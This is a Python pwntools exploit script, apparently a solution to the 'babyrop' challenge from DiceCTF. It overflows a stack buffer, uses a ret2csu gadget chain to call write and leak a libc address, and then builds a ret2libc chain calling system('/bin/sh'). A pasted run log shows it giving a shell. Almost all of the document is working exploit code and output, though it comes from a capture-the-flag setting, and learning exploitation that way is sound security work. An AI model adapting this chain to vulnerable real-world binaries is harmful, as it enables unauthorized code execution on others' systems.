from pwn import *


p = process("./babyrop")
elf = ELF("babyrop")
libc = elf.libc
'''
Given the binary was ovious ret2libc, we had the write to use it for the leak
instead of the usual puts, since the target OS was Ubuntu 20.04, the rdx for the 
write ROP chain serving as size was usual 0, it didn't worked

Now, the option was ret2csu, I used the following gadgets:-

For the first one, I setup the register here the 

r12 = edi
r13 = rsi
r14 = rdx
r15 = __init__ pointer

   0x00000000004011ca <+90>:	pop    rbx
   0x00000000004011cb <+91>:	pop    rbp
   0x00000000004011cc <+92>:	pop    r12
   0x00000000004011ce <+94>:	pop    r13
   0x00000000004011d0 <+96>:	pop    r14
   0x00000000004011d2 <+98>:	pop    r15
   0x00000000004011d4 <+100>:	ret    

The second ROP chain:-

   0x00000000004011b0 <+64>:	mov    rdx,r14
   0x00000000004011b3 <+67>:	mov    rsi,r13
   0x00000000004011b6 <+70>:	mov    edi,r12d
   0x00000000004011b9 <+73>:	call   QWORD PTR [r15+rbx*8]
   0x00000000004011bd <+77>:	add    rbx,0x1
   0x00000000004011c1 <+81>:	cmp    rbp,rbx
   0x00000000004011c4 <+84>:	jne    0x4011b0 <__libc_csu_init+64>
   0x00000000004011c6 <+86>:	add    rsp,0x8

   [..snip..]

Because of the `mov` operations we successfully set the x64 calling conventions for calling write
we get the obvious leak


Reference: https://pwning.tech/2020/04/13/ret2csu/
'''

def ret2csu(rdi, rsi, rdx):
	payload = p64(0x00000000004011ca)
	payload += p64(0)
	payload += p64(1)
	payload += p64(rdi)
	payload += p64(rsi)
	payload += p64(rdx)
	payload += p64(0x403e20 + 0x8)
	payload += p64(0x00000000004011b0)
	payload += p64(0x00)            # add rsp,0x8 padding
	payload += p64(0x00)            # rbx
	payload += p64(0x00)            # rbp
	payload += p64(0x00)            # r12
	payload += p64(0x00)            # r13
	payload += p64(0x00)            # r14
	payload += p64(0x00)            # r15
	return payload

payload = b"A"*72
payload += ret2csu(1, elf.got['gets'], 0x8)
payload += p64(elf.plt['write'])
payload += p64(elf.symbols['main'])


p.sendlineafter(": ", payload)
libc.address = u64(p.recv(6).ljust(8, b"\x00")) - libc.symbols['gets']
log.info("LIBC:   0x%x" %(libc.address))

'''
Common ret2libc, calling system("/bin/sh") with a `ret` aligning the stack on Ubuntu 20.04 and we get a shell
'''
payload = b"A"*72
payload += p64(0x00000000004011d3)
payload += p64(next(libc.search(b"/bin/sh\x00")))
payload += p64(libc.symbols['system'])
'''
❯ python3 babyrop.py
[+] Starting local process './babyrop': pid 34256
[*] '/home/d4mianwayne/Pwning/CTFs/DiceCTF/babyrop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/usr/lib/x86_64-linux-gnu/libc-2.31.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] LIBC:   0x7f4d5e09b000
[*] Switching to interactive mode
\x00Your name: $ whoami
d4mianwayne
$ 
[*] Interrupted

'''
p.sendline(payload)
p.interactive()